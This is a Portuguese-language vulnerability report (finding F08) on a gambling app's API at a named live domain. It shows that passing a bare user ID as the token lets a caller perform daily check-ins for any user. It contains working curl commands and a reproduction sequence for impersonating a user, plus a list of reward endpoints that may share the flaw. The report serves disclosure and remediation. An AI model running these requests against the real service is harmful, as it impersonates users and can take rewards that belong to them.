# 🔴 F08 — Token anão executa ações em nome de outros usuários (write)

**Severidade:** CRÍTICA
**Status:** Confirmado
**Endpoints afetados:** `/japi/user/api/signIn/v2/signIn`

## Resumo

O token anão não é apenas de **leitura**. O endpoint de check-in diário
`/japi/user/api/signIn/v2/signIn` aceita `Token: <uid>` e executa o
check-in **em nome do usuário cujo ID foi passado**. Isso escalou F01
de "ler dados" para "agir em nome de outros usuários".

## Evidência

```bash
# Token anão: uid=1, sem hash, sem timestamp
curl -s -k 'https://ds.amizade777.com/japi/user/api/signIn/v2/signIn' \
  -X POST \
  -H 'Token: 1' \
  -H 'Content-Type: application/json' \
  -d '{"appPackageName":"com.slots.big","appVersion":"1.0.0"}'

# Primeiro POST (se uid=1 não tinha check-in hoje):
# → {"code":200,"msg":null,"data":{"reward":0}}

# POST subsequente (já fez check-in hoje):
# → {"code":109001,"msg":"login do usuário hoje"}
```

Verificação pós-execução via `customerSignConfig`:

```bash
curl -s -k 'https://ds.amizade777.com/japi/user/api/signIn/customerSignConfig' \
  -H 'Token: 1'
# → {"data":{"vipLevel":0,"todaySignFlag":true,"signNum":1,...}}
```

`todaySignFlag: true` confirma que o check-in foi marcado para uid=1.

## Impacto

### Impacto direto (confirmado)

- Atacante pode fazer check-in diário em nome de QUALQUER usuário.
- Isso pode acumular dias de check-in consecutivos → recompensas
  progressivas (cashback, bônus) recebidas sem login real.
- Dependendo da mecânica de bônus, acumular dias pode desbloquear
  prêmios que seriam do usuário legítimo — interferindo no programa
  de fidelidade.

### Impacto potencial (não confirmado, mas arquiteturalmente possível)

Se outros endpoints de **ação** (não só check-in) caem no mesmo parser
fraco, o escopo é maior. Candidatos:

- `/japi/invite/boxConfig/boxReceive` — receber prêmio de caixa surpresa
- `/japi/activity/redPacketRain/getRedPacket` — pegar envelope vermelho
- `/japi/activity/redPacketRain/getReward` — receber recompensa

Esses não foram testados com token anão + ação (pra evitar pollution
de dados reais de outros usuários).

## Causa raiz

Mesmo do F01: o parser do token tem caminho fraco que aceita uid
numérico sem hash. O endpoint `signIn/v2/signIn` usa o mesmo parser
bugado e não tem validação adicional de "o uid do token bate com o
usuário que fez login?".

## Diferença para F01

| | F01 | F08 |
|--|--|--|
| Operação | Leitura | **Escrita** |
| Endpoint | querySimpleBalance | signIn/v2/signIn |
| Impacto | Ler saldo de outro | **Agir em nome de outro** |
| Reversível? | N/A | Parcialmente (check-in não pode ser desfeito) |

## Recomendação de correção

Igual ao F01 + revisar **todos** os endpoints de ação no `/japi/*`:

1. Eliminar o caminho fraco no parser de token.
2. Adicionar validação de que o uid do token bate com a sessão ativa.
3. Auditar internamente quais endpoints de **escrita** usam o parser
   fraco — `signIn/v2/signIn` foi o único confirmado externamente,
   mas provavelmente não é o único.

## Reprodução mínima

```bash
# 1. Ver signNum atual do uid=1
curl -s -k 'https://ds.amizade777.com/japi/user/api/signIn/customerSignConfig' -H 'Token: 1' | python -m json.tool

# 2. Executar check-in como uid=1
curl -s -k 'https://ds.amizade777.com/japi/user/api/signIn/v2/signIn' \
  -X POST -H 'Token: 1' -H 'Content-Type: application/json' \
  -d '{"appPackageName":"com.slots.big","appVersion":"1.0.0"}'

# 3. Confirmar incremento do signNum
curl -s -k 'https://ds.amizade777.com/japi/user/api/signIn/customerSignConfig' -H 'Token: 1' | python -m json.tool
```
